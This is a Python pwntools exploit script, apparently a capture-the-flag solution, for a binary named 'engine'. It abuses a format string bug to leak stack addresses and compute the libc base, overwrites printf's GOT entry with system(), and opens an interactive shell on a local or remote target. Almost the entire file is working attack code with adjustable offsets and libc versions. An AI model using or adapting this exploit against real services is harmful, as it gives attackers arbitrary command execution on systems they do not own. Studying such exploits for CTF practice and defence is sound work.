from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Function to be called by FmtStr
def send_payload(payload):
    io.sendlineafter(':', payload)
    io.recvuntil('(')
    result = io.recvuntil(') now')[:-5]
    return result


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './engine'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = process(exe)

# Calculate format string offset, so we can use later in write operations
format_string = FmtStr(execute_fmt=send_payload)
info("format string offset: %d", format_string.offset)

# Start program
io = start()

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local lib-c
stack_pos = 33  # %33$p is __libc_start_main+234 locally

# If executing remotely lets do a few things..
if args.REMOTE:
    # Update libc to version of the server, identified and downloaded using: https://libc.blukat.me
    libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')
    # leak and update binary base address - %34$p is main function on server (not needed locally as no PIE)
    leaked_addr = int(send_payload('%{}$p'.format(34)), 16)
    info('leaked_main_addr: %#x', leaked_addr)
    elf.address = leaked_addr - elf.symbols.main
    # Offset of libc function we want to leak is different on the server
    stack_pos = 35  # %35$p is __libc_start_main+234 remotely


# Leak the __libc_start_main_ret function from the stack
leaked_addr = int(send_payload('%{}$p'.format(stack_pos)), 16)
info('leaked_libc_addr: %#x', leaked_addr)
# Calculate offsets - https://libc.blukat.me/?q=str_bin_sh%3A0x7f2863dcae1a%2Cprintf%3A0x7f2863c7bf70
libc.address = leaked_addr - (libc.symbols['__libc_start_main'] + 234)  # Update our libc library address
info('libc_base: %#x', libc.address)
info('system: %#x', libc.symbols.system)

# Shouldn't need these, just for testing
# bin_sh = next(libc.search(b'/bin/sh\x00'))
# info('bin_sh: %#x', bin_sh)
# info('printf: %#x', libc.symbols.printf)

# Overwrite got.printf address with address of system()
format_string.write(elf.got.printf, libc.symbols.system)
# Execute the write operations
format_string.execute_writes()

# Send 'sh' to the function we've overwritten with system()
io.sendline('sh')

# Profit?
io.interactive()
